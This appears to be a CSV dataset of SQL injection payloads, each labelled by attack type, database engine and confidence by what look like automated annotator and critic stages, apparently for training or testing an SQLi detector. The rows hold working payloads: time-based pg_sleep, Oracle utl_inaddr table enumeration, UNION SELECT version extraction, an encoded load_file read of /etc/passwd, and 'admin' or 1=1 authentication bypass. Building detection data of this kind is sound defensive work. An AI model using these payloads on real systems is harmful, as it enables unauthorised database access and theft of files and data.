payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
""" or pg_sleep ( __TIME__ ) --",time_blind,postgresql,0.95,pg_sleep is PostgreSQL time-based blind SQLi,KEEP,,time_blind,postgresql,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,benign,generic,no SQLi signal in heuristic check,""" or pg_sleep ( __TIME__ ) --"
create user name identified by pass123 temporary tablespace temp default tablespace users;,stacked_queries,oracle,0.9,CREATE USER is DDL requiring stacked queries in Oracle,KEEP,,stacked_queries,oracle,1,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,create user name identified by pass123 temporary tablespace temp default tablespace users;
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr.get_host_address is Oracle error-based blind SQLi,KEEP,,error_based,oracle,2,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i"
"select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'",union_based,mysql,0.95,UNION SELECT with version() indicates union-based SQLi,KEEP,,union_based,mysql,3,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'"
"select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1",union_based,mysql,0.9,UNION SELECT with version() indicates union-based SQLi,KEEP,,union_based,mysql,4,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1"
select * from users where id = 1 +$+ or 1 = 1 -- 1,boolean_blind,mysql,0.8,+ $+ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,5,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 +$+ or 1 = 1 -- 1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;",out_of_band,mysql,0.9,load_file with char() for file read out-of-band,KEEP,,out_of_band,mysql,6,out_of_band,generic,Pattern match: 'load_file (' → out_of_band (P6); DB signature: generic,out_of_band,generic,OOB file/network function,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;"
"select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'",union_based,mysql,0.9,UNION SELECT with version() indicates union-based SQLi,KEEP,,union_based,mysql,7,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'"
"select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",union_based,mysql,0.9,\.<\ obfuscation to bypass WAF and extract VERSION,KEEP,,union_based,mysql,8,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'"
? or 1 = 1 --,boolean_blind,generic,0.9,Generic ? or 1=1 is boolean-based blind SQLi,KEEP,,boolean_blind,generic,9,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",? or 1 = 1 --
) or ( 'a' = 'a,boolean_blind,generic,0.9,Generic ) or ('a'='a' is boolean-based blind SQLi,KEEP,,boolean_blind,generic,10,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,) or ( 'a' = 'a
admin' or 1 = 1#,auth_bypass,generic,0.95,admin' or 1=1# is classic auth bypass,KEEP,,auth_bypass,generic,11,auth_bypass,generic,Pattern match: 'admin' or 1 = 1' → auth_bypass (P2); DB signature: generic,auth_bypass,generic,admin' prefix near boolean/comment context,admin' or 1 = 1#
"select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,Double quote injection for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,12,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1"
or 1 = 1 --,boolean_blind,generic,0.95,or 1=1-- is generic boolean-based blind SQLi,KEEP,,boolean_blind,generic,13,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 1 = 1 --
